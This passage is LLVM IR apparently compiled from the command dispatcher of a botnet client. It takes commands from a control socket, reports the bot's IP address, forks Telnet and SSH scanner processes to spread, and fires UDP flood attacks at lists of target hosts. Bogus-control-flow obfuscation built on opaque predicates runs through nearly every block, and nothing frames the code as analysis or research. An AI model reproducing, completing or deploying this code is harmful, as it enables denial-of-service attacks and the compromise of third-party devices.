  %39 = getelementptr inbounds i8*, i8** %38, i64 0
  %40 = load i8*, i8** %39, align 8
  %41 = call i32 @strcmp(i8* %40, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.44, i32 0, i32 0)) #10
  %42 = icmp ne i32 %41, 0
  br i1 %42, label %46, label %43

; <label>:43:                                     ; preds = %2
  %44 = load i32, i32* @mainCommSock, align 4
  %45 = call i32 (i32, i8*, ...) @sockprintf(i32 %44, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.94, i32 0, i32 0))
  br label %1358

; <label>:46:                                     ; preds = %2
  %47 = load i8**, i8*** %4, align 8
  %48 = getelementptr inbounds i8*, i8** %47, i64 0
  %49 = load i8*, i8** %48, align 8
  %50 = call i32 @strcmp(i8* %49, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.95, i32 0, i32 0)) #10
  %51 = icmp ne i32 %50, 0
  br i1 %51, label %57, label %52

; <label>:52:                                     ; preds = %46
  %53 = load i32, i32* @mainCommSock, align 4
  %54 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %55 = call i8* @inet_ntoa(i32 %54) #2
  %56 = call i32 (i32, i8*, ...) @sockprintf(i32 %53, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.96, i32 0, i32 0), i8* %55)
  br label %1358

; <label>:57:                                     ; preds = %46
  %58 = load i32, i32* @x.81
  %59 = load i32, i32* @y.82
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %57
  %66 = load i8**, i8*** %4, align 8
  %67 = getelementptr inbounds i8*, i8** %66, i64 0
  %68 = load i8*, i8** %67, align 8
  %69 = call i32 @strcmp(i8* %68, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.97, i32 0, i32 0)) #10
  %70 = icmp ne i32 %69, 0
  %71 = load i32, i32* @x.81
  %72 = load i32, i32* @y.82
  %73 = sub i32 %71, 1
  %74 = mul i32 %71, %73
  %75 = urem i32 %74, 2
  %76 = icmp eq i32 %75, 0
  %77 = icmp slt i32 %72, 10
  %78 = or i1 %76, %77
  br i1 %78, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %70, label %309, label %79

; <label>:79:                                     ; preds = %originalBBpart2
  %80 = load i32, i32* %3, align 4
  %81 = icmp ne i32 %80, 2
  br i1 %81, label %82, label %85

; <label>:82:                                     ; preds = %79
  %83 = load i32, i32* @mainCommSock, align 4
  %84 = call i32 (i32, i8*, ...) @sockprintf(i32 %83, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.98, i32 0, i32 0))
  br label %1358

; <label>:85:                                     ; preds = %79
  %86 = load i32, i32* @x.81
  %87 = load i32, i32* @y.82
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %85
  %94 = load i8**, i8*** %4, align 8
  %95 = getelementptr inbounds i8*, i8** %94, i64 1
  %96 = load i8*, i8** %95, align 8
  %97 = call i32 @strcmp(i8* %96, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.99, i32 0, i32 0)) #10
  %98 = icmp ne i32 %97, 0
  %99 = load i32, i32* @x.81
  %100 = load i32, i32* @y.82
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %98, label %308, label %107

; <label>:107:                                    ; preds = %originalBBpart24
  %108 = load i32, i32* @scanPid, align 4
  %109 = icmp eq i32 %108, 0
  br i1 %109, label %110, label %111

; <label>:110:                                    ; preds = %107
  br label %1358

; <label>:111:                                    ; preds = %107
  %112 = load i32, i32* @mainCommSock, align 4
  %113 = call i32 (i32, i8*, ...) @sockprintf(i32 %112, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.100, i32 0, i32 0))
  %114 = load i32, i32* @scanPid, align 4
  %115 = call i32 @kill(i32 %114, i32 9) #2
  store i32 0, i32* @scanPid, align 4
  %116 = load i8**, i8*** %4, align 8
  %117 = getelementptr inbounds i8*, i8** %116, i64 1
  %118 = load i8*, i8** %117, align 8
  %119 = call i32 @strcmp(i8* %118, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.101, i32 0, i32 0)) #10
  %120 = icmp ne i32 %119, 0
  br i1 %120, label %203, label %121

; <label>:121:                                    ; preds = %111
  %122 = load i32, i32* @scanPid, align 4
  %123 = icmp ne i32 %122, 0
  br i1 %123, label %124, label %141

; <label>:124:                                    ; preds = %121
  %125 = load i32, i32* @x.81
  %126 = load i32, i32* @y.82
  %127 = sub i32 %125, 1
  %128 = mul i32 %125, %127
  %129 = urem i32 %128, 2
  %130 = icmp eq i32 %129, 0
  %131 = icmp slt i32 %126, 10
  %132 = or i1 %130, %131
  br i1 %132, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %124
  %133 = load i32, i32* @x.81
  %134 = load i32, i32* @y.82
  %135 = sub i32 %133, 1
  %136 = mul i32 %133, %135
  %137 = urem i32 %136, 2
  %138 = icmp eq i32 %137, 0
  %139 = icmp slt i32 %134, 10
  %140 = or i1 %138, %139
  br i1 %140, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %1358

; <label>:141:                                    ; preds = %121
  %142 = call i32 @fork() #2
  store i32 %142, i32* %6, align 4
  %143 = load i32, i32* @mainCommSock, align 4
  %144 = call i32 (i32, i8*, ...) @sockprintf(i32 %143, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.102, i32 0, i32 0))
  %145 = load i32, i32* %6, align 4
  %146 = icmp ugt i32 %145, 0
  br i1 %146, label %147, label %165

; <label>:147:                                    ; preds = %141
  %148 = load i32, i32* @x.81
  %149 = load i32, i32* @y.82
  %150 = sub i32 %148, 1
  %151 = mul i32 %148, %150
  %152 = urem i32 %151, 2
  %153 = icmp eq i32 %152, 0
  %154 = icmp slt i32 %149, 10
  %155 = or i1 %153, %154
  br i1 %155, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %147
  %156 = load i32, i32* %6, align 4
  store i32 %156, i32* @scanPid, align 4
  %157 = load i32, i32* @x.81
  %158 = load i32, i32* @y.82
  %159 = sub i32 %157, 1
  %160 = mul i32 %157, %159
  %161 = urem i32 %160, 2
  %162 = icmp eq i32 %161, 0
  %163 = icmp slt i32 %158, 10
  %164 = or i1 %162, %163
  br i1 %164, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %1358

; <label>:165:                                    ; preds = %141
  %166 = load i32, i32* @x.81
  %167 = load i32, i32* @y.82
  %168 = sub i32 %166, 1
  %169 = mul i32 %166, %168
  %170 = urem i32 %169, 2
  %171 = icmp eq i32 %170, 0
  %172 = icmp slt i32 %167, 10
  %173 = or i1 %171, %172
  br i1 %173, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %165
  %174 = load i32, i32* %6, align 4
  %175 = icmp eq i32 %174, -1
  %176 = load i32, i32* @x.81
  %177 = load i32, i32* @y.82
  %178 = sub i32 %176, 1
  %179 = mul i32 %176, %178
  %180 = urem i32 %179, 2
  %181 = icmp eq i32 %180, 0
  %182 = icmp slt i32 %177, 10
  %183 = or i1 %181, %182
  br i1 %183, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %175, label %184, label %185

; <label>:184:                                    ; preds = %originalBBpart216
  br label %1358

; <label>:185:                                    ; preds = %originalBBpart216
  br label %186

; <label>:186:                                    ; preds = %185
  %187 = load i32, i32* @x.81
  %188 = load i32, i32* @y.82
  %189 = sub i32 %187, 1
  %190 = mul i32 %187, %189
  %191 = urem i32 %190, 2
  %192 = icmp eq i32 %191, 0
  %193 = icmp slt i32 %188, 10
  %194 = or i1 %192, %193
  br i1 %194, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %186
  call void (i32, ...) bitcast (void ()* @TelnetScanner to void (i32, ...)*)(i32 1)
  call void @_exit(i32 0) #12
  %195 = load i32, i32* @x.81
  %196 = load i32, i32* @y.82
  %197 = sub i32 %195, 1
  %198 = mul i32 %195, %197
  %199 = urem i32 %198, 2
  %200 = icmp eq i32 %199, 0
  %201 = icmp slt i32 %196, 10
  %202 = or i1 %200, %201
  br i1 %202, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  unreachable

; <label>:203:                                    ; preds = %111
  %204 = load i8**, i8*** %4, align 8
  %205 = getelementptr inbounds i8*, i8** %204, i64 1
  %206 = load i8*, i8** %205, align 8
  %207 = call i32 @strcmp(i8* %206, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.103, i32 0, i32 0)) #10
  %208 = icmp ne i32 %207, 0
  br i1 %208, label %291, label %209

; <label>:209:                                    ; preds = %203
  %210 = load i32, i32* @scanPid, align 4
  %211 = icmp ne i32 %210, 0
  br i1 %211, label %212, label %213

; <label>:212:                                    ; preds = %209
  br label %1358

; <label>:213:                                    ; preds = %209
  %214 = load i32, i32* @x.81
  %215 = load i32, i32* @y.82
  %216 = sub i32 %214, 1
  %217 = mul i32 %214, %216
  %218 = urem i32 %217, 2
  %219 = icmp eq i32 %218, 0
  %220 = icmp slt i32 %215, 10
  %221 = or i1 %219, %220
  br i1 %221, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %213
  %222 = call i32 @fork() #2
  store i32 %222, i32* %7, align 4
  %223 = load i32, i32* @mainCommSock, align 4
  %224 = call i32 (i32, i8*, ...) @sockprintf(i32 %223, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.104, i32 0, i32 0))
  %225 = load i32, i32* %7, align 4
  %226 = icmp ugt i32 %225, 0
  %227 = load i32, i32* @x.81
  %228 = load i32, i32* @y.82
  %229 = sub i32 %227, 1
  %230 = mul i32 %227, %229
  %231 = urem i32 %230, 2
  %232 = icmp eq i32 %231, 0
  %233 = icmp slt i32 %228, 10
  %234 = or i1 %232, %233
  br i1 %234, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %226, label %235, label %253

; <label>:235:                                    ; preds = %originalBBpart224
  %236 = load i32, i32* @x.81
  %237 = load i32, i32* @y.82
  %238 = sub i32 %236, 1
  %239 = mul i32 %236, %238
  %240 = urem i32 %239, 2
  %241 = icmp eq i32 %240, 0
  %242 = icmp slt i32 %237, 10
  %243 = or i1 %241, %242
  br i1 %243, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %235
  %244 = load i32, i32* %7, align 4
  store i32 %244, i32* @scanPid, align 4
  %245 = load i32, i32* @x.81
  %246 = load i32, i32* @y.82
  %247 = sub i32 %245, 1
  %248 = mul i32 %245, %247
  %249 = urem i32 %248, 2
  %250 = icmp eq i32 %249, 0
  %251 = icmp slt i32 %246, 10
  %252 = or i1 %250, %251
  br i1 %252, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %1358

; <label>:253:                                    ; preds = %originalBBpart224
  %254 = load i32, i32* @x.81
  %255 = load i32, i32* @y.82
  %256 = sub i32 %254, 1
  %257 = mul i32 %254, %256
  %258 = urem i32 %257, 2
  %259 = icmp eq i32 %258, 0
  %260 = icmp slt i32 %255, 10
  %261 = or i1 %259, %260
  br i1 %261, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %253
  %262 = load i32, i32* %7, align 4
  %263 = icmp eq i32 %262, -1
  %264 = load i32, i32* @x.81
  %265 = load i32, i32* @y.82
  %266 = sub i32 %264, 1
  %267 = mul i32 %264, %266
  %268 = urem i32 %267, 2
  %269 = icmp eq i32 %268, 0
  %270 = icmp slt i32 %265, 10
  %271 = or i1 %269, %270
  br i1 %271, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %263, label %272, label %273

; <label>:272:                                    ; preds = %originalBBpart232
  br label %1358

; <label>:273:                                    ; preds = %originalBBpart232
  %274 = load i32, i32* @x.81
  %275 = load i32, i32* @y.82
  %276 = sub i32 %274, 1
  %277 = mul i32 %274, %276
  %278 = urem i32 %277, 2
  %279 = icmp eq i32 %278, 0
  %280 = icmp slt i32 %275, 10
  %281 = or i1 %279, %280
  br i1 %281, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %273
  %282 = load i32, i32* @x.81
  %283 = load i32, i32* @y.82
  %284 = sub i32 %282, 1
  %285 = mul i32 %282, %284
  %286 = urem i32 %285, 2
  %287 = icmp eq i32 %286, 0
  %288 = icmp slt i32 %283, 10
  %289 = or i1 %287, %288
  br i1 %289, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br label %290

; <label>:290:                                    ; preds = %originalBBpart236
  call void (i32, ...) bitcast (void ()* @SSHScanner to void (i32, ...)*)(i32 1)
  call void @_exit(i32 0) #12
  unreachable

; <label>:291:                                    ; preds = %203
  %292 = load i32, i32* @x.81
  %293 = load i32, i32* @y.82
  %294 = sub i32 %292, 1
  %295 = mul i32 %292, %294
  %296 = urem i32 %295, 2
  %297 = icmp eq i32 %296, 0
  %298 = icmp slt i32 %293, 10
  %299 = or i1 %297, %298
  br i1 %299, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %291
  %300 = load i32, i32* @x.81
  %301 = load i32, i32* @y.82
  %302 = sub i32 %300, 1
  %303 = mul i32 %300, %302
  %304 = urem i32 %303, 2
  %305 = icmp eq i32 %304, 0
  %306 = icmp slt i32 %301, 10
  %307 = or i1 %305, %306
  br i1 %307, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br label %308

; <label>:308:                                    ; preds = %originalBBpart240, %originalBBpart24
  br label %309

; <label>:309:                                    ; preds = %308, %originalBBpart2
  %310 = load i8**, i8*** %4, align 8
  %311 = getelementptr inbounds i8*, i8** %310, i64 0
  %312 = load i8*, i8** %311, align 8
  %313 = call i32 @strcmp(i8* %312, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.105, i32 0, i32 0)) #10
  %314 = icmp ne i32 %313, 0
  br i1 %314, label %540, label %315

; <label>:315:                                    ; preds = %309
  %316 = load i32, i32* %3, align 4
  %317 = icmp slt i32 %316, 6
  br i1 %317, label %411, label %318

; <label>:318:                                    ; preds = %315
  %319 = load i8**, i8*** %4, align 8
  %320 = getelementptr inbounds i8*, i8** %319, i64 3
  %321 = load i8*, i8** %320, align 8
  %322 = call i32 @atoi(i8* %321) #10
  %323 = icmp eq i32 %322, -1
  br i1 %323, label %411, label %324

; <label>:324:                                    ; preds = %318
  %325 = load i8**, i8*** %4, align 8
  %326 = getelementptr inbounds i8*, i8** %325, i64 2
  %327 = load i8*, i8** %326, align 8
  %328 = call i32 @atoi(i8* %327) #10
  %329 = icmp eq i32 %328, -1
  br i1 %329, label %411, label %330

; <label>:330:                                    ; preds = %324
  %331 = load i32, i32* @x.81
  %332 = load i32, i32* @y.82
  %333 = sub i32 %331, 1
  %334 = mul i32 %331, %333
  %335 = urem i32 %334, 2
  %336 = icmp eq i32 %335, 0
  %337 = icmp slt i32 %332, 10
  %338 = or i1 %336, %337
  br i1 %338, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %330
  %339 = load i8**, i8*** %4, align 8
  %340 = getelementptr inbounds i8*, i8** %339, i64 4
  %341 = load i8*, i8** %340, align 8
  %342 = call i32 @atoi(i8* %341) #10
  %343 = icmp eq i32 %342, -1
  %344 = load i32, i32* @x.81
  %345 = load i32, i32* @y.82
  %346 = sub i32 %344, 1
  %347 = mul i32 %344, %346
  %348 = urem i32 %347, 2
  %349 = icmp eq i32 %348, 0
  %350 = icmp slt i32 %345, 10
  %351 = or i1 %349, %350
  br i1 %351, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br i1 %343, label %411, label %352

; <label>:352:                                    ; preds = %originalBBpart244
  %353 = load i32, i32* @x.81
  %354 = load i32, i32* @y.82
  %355 = sub i32 %353, 1
  %356 = mul i32 %353, %355
  %357 = urem i32 %356, 2
  %358 = icmp eq i32 %357, 0
  %359 = icmp slt i32 %354, 10
  %360 = or i1 %358, %359
  br i1 %360, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %352
  %361 = load i8**, i8*** %4, align 8
  %362 = getelementptr inbounds i8*, i8** %361, i64 5
  %363 = load i8*, i8** %362, align 8
  %364 = call i32 @atoi(i8* %363) #10
  %365 = icmp eq i32 %364, -1
  %366 = load i32, i32* @x.81
  %367 = load i32, i32* @y.82
  %368 = sub i32 %366, 1
  %369 = mul i32 %366, %368
  %370 = urem i32 %369, 2
  %371 = icmp eq i32 %370, 0
  %372 = icmp slt i32 %367, 10
  %373 = or i1 %371, %372
  br i1 %373, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br i1 %365, label %411, label %374

; <label>:374:                                    ; preds = %originalBBpart248
  %375 = load i32, i32* @x.81
  %376 = load i32, i32* @y.82
  %377 = sub i32 %375, 1
  %378 = mul i32 %375, %377
  %379 = urem i32 %378, 2
  %380 = icmp eq i32 %379, 0
  %381 = icmp slt i32 %376, 10
  %382 = or i1 %380, %381
  br i1 %382, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %374
  %383 = load i8**, i8*** %4, align 8
  %384 = getelementptr inbounds i8*, i8** %383, i64 5
  %385 = load i8*, i8** %384, align 8
  %386 = call i32 @atoi(i8* %385) #10
  %387 = icmp sgt i32 %386, 65500
  %388 = load i32, i32* @x.81
  %389 = load i32, i32* @y.82
  %390 = sub i32 %388, 1
  %391 = mul i32 %388, %390
  %392 = urem i32 %391, 2
  %393 = icmp eq i32 %392, 0
  %394 = icmp slt i32 %389, 10
  %395 = or i1 %393, %394
  br i1 %395, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br i1 %387, label %411, label %396

; <label>:396:                                    ; preds = %originalBBpart252
  %397 = load i8**, i8*** %4, align 8
  %398 = getelementptr inbounds i8*, i8** %397, i64 4
  %399 = load i8*, i8** %398, align 8
  %400 = call i32 @atoi(i8* %399) #10
  %401 = icmp sgt i32 %400, 32
  br i1 %401, label %411, label %402

; <label>:402:                                    ; preds = %396
  %403 = load i32, i32* %3, align 4
  %404 = icmp eq i32 %403, 7
  br i1 %404, label %405, label %412

; <label>:405:                                    ; preds = %402
  %406 = load i8**, i8*** %4, align 8
  %407 = getelementptr inbounds i8*, i8** %406, i64 6
  %408 = load i8*, i8** %407, align 8
  %409 = call i32 @atoi(i8* %408) #10
  %410 = icmp slt i32 %409, 1
  br i1 %410, label %411, label %412

; <label>:411:                                    ; preds = %405, %396, %originalBBpart252, %originalBBpart248, %originalBBpart244, %324, %318, %315
  br label %1358

; <label>:412:                                    ; preds = %405, %402
  %413 = load i8**, i8*** %4, align 8
  %414 = getelementptr inbounds i8*, i8** %413, i64 1
  %415 = load i8*, i8** %414, align 8
  store i8* %415, i8** %8, align 8
  %416 = load i8**, i8*** %4, align 8
  %417 = getelementptr inbounds i8*, i8** %416, i64 2
  %418 = load i8*, i8** %417, align 8
  %419 = call i32 @atoi(i8* %418) #10
  store i32 %419, i32* %9, align 4
  %420 = load i8**, i8*** %4, align 8
  %421 = getelementptr inbounds i8*, i8** %420, i64 3
  %422 = load i8*, i8** %421, align 8
  %423 = call i32 @atoi(i8* %422) #10
  store i32 %423, i32* %10, align 4
  %424 = load i8**, i8*** %4, align 8
  %425 = getelementptr inbounds i8*, i8** %424, i64 4
  %426 = load i8*, i8** %425, align 8
  %427 = call i32 @atoi(i8* %426) #10
  store i32 %427, i32* %11, align 4
  %428 = load i8**, i8*** %4, align 8
  %429 = getelementptr inbounds i8*, i8** %428, i64 5
  %430 = load i8*, i8** %429, align 8
  %431 = call i32 @atoi(i8* %430) #10
  store i32 %431, i32* %12, align 4
  %432 = load i32, i32* %3, align 4
  %433 = icmp eq i32 %432, 7
  br i1 %433, label %434, label %455

; <label>:434:                                    ; preds = %412
  %435 = load i32, i32* @x.81
  %436 = load i32, i32* @y.82
  %437 = sub i32 %435, 1
  %438 = mul i32 %435, %437
  %439 = urem i32 %438, 2
  %440 = icmp eq i32 %439, 0
  %441 = icmp slt i32 %436, 10
  %442 = or i1 %440, %441
  br i1 %442, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %434
  %443 = load i8**, i8*** %4, align 8
  %444 = getelementptr inbounds i8*, i8** %443, i64 6
  %445 = load i8*, i8** %444, align 8
  %446 = call i32 @atoi(i8* %445) #10
  %447 = load i32, i32* @x.81
  %448 = load i32, i32* @y.82
  %449 = sub i32 %447, 1
  %450 = mul i32 %447, %449
  %451 = urem i32 %450, 2
  %452 = icmp eq i32 %451, 0
  %453 = icmp slt i32 %448, 10
  %454 = or i1 %452, %453
  br i1 %454, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br label %456

; <label>:455:                                    ; preds = %412
  br label %456

; <label>:456:                                    ; preds = %455, %originalBBpart256
  %457 = phi i32 [ %446, %originalBBpart256 ], [ 10, %455 ]
  %458 = load i32, i32* @x.81
  %459 = load i32, i32* @y.82
  %460 = sub i32 %458, 1
  %461 = mul i32 %458, %460
  %462 = urem i32 %461, 2
  %463 = icmp eq i32 %462, 0
  %464 = icmp slt i32 %459, 10
  %465 = or i1 %463, %464
  br i1 %465, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %456
  store i32 %457, i32* %13, align 4
  %466 = load i8*, i8** %8, align 8
  %467 = call i8* @strstr(i8* %466, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #10
  %468 = icmp ne i8* %467, null
  %469 = load i32, i32* @x.81
  %470 = load i32, i32* @y.82
  %471 = sub i32 %469, 1
  %472 = mul i32 %469, %471
  %473 = urem i32 %472, 2
  %474 = icmp eq i32 %473, 0
  %475 = icmp slt i32 %470, 10
  %476 = or i1 %474, %475
  br i1 %476, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br i1 %468, label %477, label %528

; <label>:477:                                    ; preds = %originalBBpart260
  %478 = load i32, i32* @x.81
  %479 = load i32, i32* @y.82
  %480 = sub i32 %478, 1
  %481 = mul i32 %478, %480
  %482 = urem i32 %481, 2
  %483 = icmp eq i32 %482, 0
  %484 = icmp slt i32 %479, 10
  %485 = or i1 %483, %484
  br i1 %485, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %477
  %486 = load i8*, i8** %8, align 8
  %487 = call i8* @strtok(i8* %486, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #2
  store i8* %487, i8** %14, align 8
  %488 = load i32, i32* @x.81
  %489 = load i32, i32* @y.82
  %490 = sub i32 %488, 1
  %491 = mul i32 %488, %490
  %492 = urem i32 %491, 2
  %493 = icmp eq i32 %492, 0
  %494 = icmp slt i32 %489, 10
  %495 = or i1 %493, %494
  br i1 %495, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br label %496

; <label>:496:                                    ; preds = %525, %originalBBpart264
  %497 = load i8*, i8** %14, align 8
  %498 = icmp ne i8* %497, null
  br i1 %498, label %499, label %527

; <label>:499:                                    ; preds = %496
  %500 = call i32 @listFork()
  %501 = icmp ne i32 %500, 0
  br i1 %501, label %525, label %502

; <label>:502:                                    ; preds = %499
  %503 = load i32, i32* @x.81
  %504 = load i32, i32* @y.82
  %505 = sub i32 %503, 1
  %506 = mul i32 %503, %505
  %507 = urem i32 %506, 2
  %508 = icmp eq i32 %507, 0
  %509 = icmp slt i32 %504, 10
  %510 = or i1 %508, %509
  br i1 %510, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %502
  %511 = load i8*, i8** %14, align 8
  %512 = load i32, i32* %9, align 4
  %513 = load i32, i32* %10, align 4
  %514 = load i32, i32* %11, align 4
  %515 = load i32, i32* %12, align 4
  %516 = load i32, i32* %13, align 4
  call void @sendUDP(i8* %511, i32 %512, i32 %513, i32 %514, i32 %515, i32 %516)
  call void @_exit(i32 0) #12
  %517 = load i32, i32* @x.81
  %518 = load i32, i32* @y.82
  %519 = sub i32 %517, 1
  %520 = mul i32 %517, %519
  %521 = urem i32 %520, 2
  %522 = icmp eq i32 %521, 0
  %523 = icmp slt i32 %518, 10
  %524 = or i1 %522, %523
  br i1 %524, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  unreachable

; <label>:525:                                    ; preds = %499
  %526 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #2
  store i8* %526, i8** %14, align 8
  br label %496

; <label>:527:                                    ; preds = %496
  br label %539

; <label>:528:                                    ; preds = %originalBBpart260
  %529 = call i32 @listFork()
  %530 = icmp ne i32 %529, 0
  br i1 %530, label %531, label %532

; <label>:531:                                    ; preds = %528
  br label %1358

; <label>:532:                                    ; preds = %528
  %533 = load i8*, i8** %8, align 8
  %534 = load i32, i32* %9, align 4
  %535 = load i32, i32* %10, align 4
  %536 = load i32, i32* %11, align 4
  %537 = load i32, i32* %12, align 4
  %538 = load i32, i32* %13, align 4
  call void @sendUDP(i8* %533, i32 %534, i32 %535, i32 %536, i32 %537, i32 %538)
  call void @_exit(i32 0) #12
  unreachable

; <label>:539:                                    ; preds = %527
  br label %540

; <label>:540:                                    ; preds = %539, %309
  %541 = load i8**, i8*** %4, align 8
  %542 = getelementptr inbounds i8*, i8** %541, i64 0
  %543 = load i8*, i8** %542, align 8
  %544 = call i32 @strcmp(i8* %543, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.106, i32 0, i32 0)) #10
  %545 = icmp ne i32 %544, 0
  br i1 %545, label %763, label %546

; <label>:546:                                    ; preds = %540
  %547 = load i32, i32* %3, align 4
  %548 = icmp slt i32 %547, 6
  br i1 %548, label %607, label %549

; <label>:549:                                    ; preds = %546
  %550 = load i32, i32* @x.81
  %551 = load i32, i32* @y.82
  %552 = sub i32 %550, 1
  %553 = mul i32 %550, %552
  %554 = urem i32 %553, 2
  %555 = icmp eq i32 %554, 0
  %556 = icmp slt i32 %551, 10
  %557 = or i1 %555, %556
  br i1 %557, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %549
  %558 = load i8**, i8*** %4, align 8
  %559 = getelementptr inbounds i8*, i8** %558, i64 3
  %560 = load i8*, i8** %559, align 8
  %561 = call i32 @atoi(i8* %560) #10
  %562 = icmp eq i32 %561, -1
  %563 = load i32, i32* @x.81
  %564 = load i32, i32* @y.82
  %565 = sub i32 %563, 1
  %566 = mul i32 %563, %565
  %567 = urem i32 %566, 2
  %568 = icmp eq i32 %567, 0
  %569 = icmp slt i32 %564, 10
  %570 = or i1 %568, %569
  br i1 %570, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  br i1 %562, label %607, label %571

; <label>:571:                                    ; preds = %originalBBpart272
  %572 = load i8**, i8*** %4, align 8
  %573 = getelementptr inbounds i8*, i8** %572, i64 2
  %574 = load i8*, i8** %573, align 8
  %575 = call i32 @atoi(i8* %574) #10
  %576 = icmp eq i32 %575, -1
  br i1 %576, label %607, label %577

; <label>:577:                                    ; preds = %571
  %578 = load i8**, i8*** %4, align 8
  %579 = getelementptr inbounds i8*, i8** %578, i64 4
  %580 = load i8*, i8** %579, align 8
  %581 = call i32 @atoi(i8* %580) #10
  %582 = icmp eq i32 %581, -1
  br i1 %582, label %607, label %583

; <label>:583:                                    ; preds = %577
  %584 = load i8**, i8*** %4, align 8
  %585 = getelementptr inbounds i8*, i8** %584, i64 4
  %586 = load i8*, i8** %585, align 8
  %587 = call i32 @atoi(i8* %586) #10
  %588 = icmp sgt i32 %587, 32
  br i1 %588, label %607, label %589

; <label>:589:                                    ; preds = %583
  %590 = load i32, i32* %3, align 4
  %591 = icmp sgt i32 %590, 6
  br i1 %591, label %592, label %598

; <label>:592:                                    ; preds = %589
  %593 = load i8**, i8*** %4, align 8
  %594 = getelementptr inbounds i8*, i8** %593, i64 6
  %595 = load i8*, i8** %594, align 8
  %596 = call i32 @atoi(i8* %595) #10
  %597 = icmp slt i32 %596, 0
  br i1 %597, label %607, label %598

; <label>:598:                                    ; preds = %592, %589
  %599 = load i32, i32* %3, align 4
  %600 = icmp eq i32 %599, 8
  br i1 %600, label %601, label %608

; <label>:601:                                    ; preds = %598
  %602 = load i8**, i8*** %4, align 8
